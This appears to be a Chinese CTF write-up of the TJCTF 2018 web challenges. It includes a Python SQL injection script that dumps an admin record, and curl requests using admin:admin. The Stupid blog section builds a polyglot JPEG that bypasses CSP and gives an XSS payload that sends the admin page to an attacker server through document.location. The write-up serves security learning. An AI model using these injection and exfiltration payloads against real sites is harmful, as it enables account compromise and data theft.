> 原文链接: https://www.anquanke.com//post/id/156434 


# TJCTF 2018 Web专题全解析


                                阅读量   
                                **248372**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01c6f13be09a1a1aee.jpg)](https://p1.ssl.qhimg.com/t01c6f13be09a1a1aee.jpg)

闲的无聊，打了下最近的tjctf2018，这场比赛挺不错的，许多新颖的题目，题目难度分层恰当，有难有易，下面是这次的Web专栏writeup。



## Web_Bank

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_1.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_1.png)打开页面，查看源代码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_2.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_2.png)



## Web_Cookie Monster

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_3.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_3.png)

打开页面，查看源代码，有个`/legs`，打开<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_4.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_4.png)

继续右键查看源代码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_5.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_5.png)



## Web_Central Savings Account

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_6.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_6.png)

打开网页，查看源代码。<br>
接着打开`/static/main.js`，拉到底部，md5解码得到答案<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7.png)



## Web_Programmable Hyperlinked Pasta

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7_1.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_7_1.png)

打开网页<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_8.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_8.png)

查看源代码，发现提示<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_9.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_9.png)

然而并没啥卵用。。。<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_10.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_10.png)

去看看下面那个链接<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_11.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_11.png)

接着尝试改下get的url

```
https://programmable_hyperlinked_pasta.tjctf.org/?lang=en.php
https://programmable_hyperlinked_pasta.tjctf.org/?lang=ch.php
```

都是空白页面<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_12.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_12.png)

随便尝试。。看到很多**消息。。。<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_13.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_13.png)

查看下源代码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_14.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_14.png)

去网站根目录瞧瞧，嘿嘿<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_15.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_15.png)

当然。。。。。这样也是可以的<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_16.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_16.png)



## Web_Request Me

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_17.png)<br>
打开网页<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_18.png)

查看源代码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_18_1.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_18_1.png)

点点看咯，毕竟也没别的东西<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_19.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_19.png)

随后你打开后，就会发现你做此题所需要了解的http请求方式+curl请求方式知识的链接：

[https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS)

其实就是下面这张图里面的内容：<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_20.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_20.png)

这里有个http请求方式相关链接：

[https://www.cnblogs.com/testcoffee/p/6295970.html](https://www.cnblogs.com/testcoffee/p/6295970.html)

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_21.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_21.png)

了解了这些，我们用curl试水下<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_22.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_22.png)

题目url的请求方式都试了一遍，可以看到，`POST`和`DELETE`需要凭证<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_23.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_23.png)

`PUT`需要<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_24.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_24.png)

em~

凭证是什么鬼。。。后面继续试水，这里巨坑

原来所谓的凭证需要经过自己手工fuzz，一波踩坑，请求的data为：`username=admin&amp;password=admin`<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_25.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_25.png)

可以看到PUT有以下结果

```
$ curl -X PUT "https://request_me.tjctf.org/" --data username=admin&amp;password=admin
I stole your credentials!
```

好的，告诉我们得到了凭证，那试试DELECT吧（这里试过get、post，但是没用）<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_26.png)

最后谷歌一番，尝试<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_27.png)

得到flag

这里还有个坑点：请求方式需要按照以下命令依次输入执行，并且DELETE这条命令需要输入两遍才能得到flag（尝试无数遍的操作）

```
$ curl -X POST "https://request_me.tjctf.org/" --data username=admin&amp;password=admin
$ curl -X PUT "https://request_me.tjctf.org/" --data username=admin&amp;password=admin
$ curl -X DELETE "https://request_me.tjctf.org/" --data username=admin&amp;password=admin -u admin:admin
```



## Web_Moar Horses

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_28.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_28.png)

打开网页，看到这个，跟原来那题很想。。。打开开发者工具，会发现随着网页往下托，控制台会出现许多网页<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_29.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_29.png)

咯，就是这样，往下滑不见底的那种<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_30.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_30.png)

查看其中任意一个html的源码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_31.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_31.png)

猜测应该是大量html中含有一个带有flag的html文件。。。那怎么办呢。总不能一直拉着鼠标往下拖吧。。。。百度，谷歌了下，其实。。。控制台写个命令就行

`window.setInterval(function()`{`window.scrollByLines(10000)`}`,1)`<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_32.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_32.png)

然后跑啊跑。。。。。。。1500多条才跑出来。。。<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_33.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_33.png)

后面用ubuntu自带的火狐，跑了100多条请求就跑出来。。晕死。。这是为啥？<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_34.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_34.png)<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_35.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_35.png)



## Web_Ess Kyoo Ell

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_36.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_36.png)

打开网页<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_37.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_37.png)

随意测试,用bp拦截下<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38.png)

再看看网页<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38_1.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_38_1.png)

提示`This is what I got about you from the database: no such column: password`

再看看响应的源代码<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_39.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_39.png)

尝试<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_40.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_40.png)

这里有检验`@`，试试bp能不能绕过<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_41.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_41.png)

提示还是：`This is what I got about you from the database: no such column: password`

尝试改改post的数据`password`-&gt;`passwd`

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_42.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_42.png)

提示：`This is what I got about you from the database: no such column: passwd`

到这里大概知道我们可以干啥了。。通过修改这个字段，让服务器查询出我们想得到的信息

根据上面的分析，或许使用python的request请求更加合适呢！

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_43.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_43.png)

这里简单的sql测试,就基本可以大致的信息，题目所求用户admin的ip地址

```
#-*-coding:utf-8

import requests

url = 'https://ess-kyoo-ell.tjctf.org'

s=requests.Session()

data=`{`

    "email":"' or 1=1 #",

    #"username or 1=1 --":""

    "(username or 1=1) and username = 'admin' --":""

`}`

r=s.post(url,data=data)

print 'n'.join(r.text.split('n')[174:174+18])     #只查看174~174+18行的网页源代码

s.close()
```

得到运行结果

```
&lt;p id="profile-name" class="profile-name-card"&gt;This is what I got about you from the database: `{`'id': 706, 'username': 'admin', 'first_name': 'Administrative', 'last_name': 'User', 'email': '[email protected]', 'gender': 'Female', 'ip_address': '145.3.1.213'`}`&lt;/p&gt;
```

答案即是tjctf`{`145.3.1.213`}`



## Web_Stupid blog

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_44.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_44.png)

打开页面，有注册和登录，那就是注册再登录试试咯

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_45.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_45.png)

注册了个账号，jianghuxia ,登录后发现自己的主页url是：`https://stupid_blog.tjctf.org/jianghuxia`

推测每个`username`的页面是`https://stupid_blog.tjctf.org/&lt;username&gt;`，那么先尝试下`https://stupid_blog.tjctf.org/admin`，得到下图提示

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_46.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_46.png)

仔细看看页面，发现有3个模块：`Report a User、Update Profile Picture (png, jpg)、Save`

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_47.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_47.png)

感觉似曾相识em~流程大概是这么一个样，上传个人资料图片（JPEG / PNG），在个人“Posts”上设置帖子，最后提交给管理员，如果这样的话，考察的就是XSS咯

那么先测试一波上传，测试途中，发现了配置文件图像的固定URL是：`https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp`

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_48.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_48.png)

尝试过抓包冒充扩展名，但会发现因为是固定的路径，所以就算上传成功后，都是一张默认用户的图片，如果要进行其他的测试也是行不通的

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_49.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_49.png)

尝试上传正常的图片，会发现正常显示，且访问路径`https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp`

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_50.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_50.png)

会跳转到刚刚的上传文件的下载<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_51.png)

到此，大致能分析出后台具有挺严格的图片上传过滤规则，那么现在是能在图片数据域里做手脚了。。

再测试XSS的时候，几经测试，发现又具有严格的CSP规则。。。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_52.png)

em~那现在方向和思路都很明显了

通过XSS使用JPG或者png文件上传绕过`CSP（Content-Security-Policy）`

而关键的是，我们要把XSS的关键代码写入JPG中，绕过CSP

尝试了几波无果，没思路咯，网上搜了一番，嘿嘿，找到个跟这个好像的 ：

[https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs](https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs)

根据这篇文章分析，贼有意思，此文作者研究了JPG的文件格式，把脚本隐藏在了jpg图像中，orz…

首先，jpg文件格式的头部：

前4个字节是jpg文件头，随后2个字节，代表后面所填充的JPEG标头的长度

`FF D8 FF E0 2F 2A 4A 46 49 46 00 01 01 01 00 48 00 48 00 00 00 00 00 00 00 00 00 00`

接着，表示jpg数据域的开始的两个字节：`0xFF`， `0xFE`，其后面紧跟两个代表数据域长度的字节

比如：`FF FE 00 1C 2A 2F 3D 61 6C 65 72 74 28 22 42 75 72 70 20 72 6F 63 6B 73 2E 22 29 3B 2F 2A`

`0xFF`，`0xFE`代表数据域开始，`0x00`，`0x1C`代表后面数据的长度加上这两个字节的本身长度。0x001C化为十进制代表28个字节，也就是56位

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_53.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_53.png)

最后，JPG的文件尾部`2A 2F 2F 2F FF D9`

`0xFF`、`0xD9`代表JPG文件尾部的最后2个字节，意味着JPG文件的结束.

如此，当把代码`/=alert("Burp rocks.");/*`插入到一张jpg中，将是下面格式

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_54.png)

接着回到题目先上传该文件，上传成功后，你可以访问`https://stupid_blog.tjctf.org/&lt;Username&gt;/pfp`

下载这时的pfp文件，验证是否跟上传的一样

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_55.png)

可以发现一模一样，意味着成功往JPG中写入了代码，再看看能不能执行

Post填入

`&lt;script charset="ISO-8859-1" src="/jianghuxia/pfp"&gt;&lt;/script&gt;`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_56.png)

SAVE，就会弹出提示框

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_57.png)

很好，我们成功了。那么接下来只需要简单改改上传图片中的代码，然后进行相同的操作，最后再进行一步“Report a User”就行。

现在需要写入的是：

`*/=x=new XMLHttpRequest();x.open("GET","admin",false);x.send(null);document.location="http://&lt;your severhost&gt;/j"+x.responseText;/*`

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_58.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_58.png)<br>
按照刚刚的填充JPG文件方法，计算长度<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_59.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_59.png)

再加上前面2个代表长度的标识字节,264+2*2=268,268/2=134，再转16进制，为0x86。再加上JPG的文件头尾格式，得到下图

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_60.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_60.png)

上传文件，并且上传完成后再SAVE一遍Posts<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_61.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_61.png)

报告提交给admin<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_62.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_62.png)

提交成功

[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_63.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_63.png)

然后坐等自己服务器日志收到的新信息<br>[![](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_64.png)](https://jianghuxia.github.io/2018/08/13/tjctf2018/tjctf2018_web_64.png)

web已完毕,以上就是TJCTF web专题的writeup,感觉前面3题都是很简单的，第四题开始，难度步步提升，对于菜鸡（我）还是很爽的。。orz…
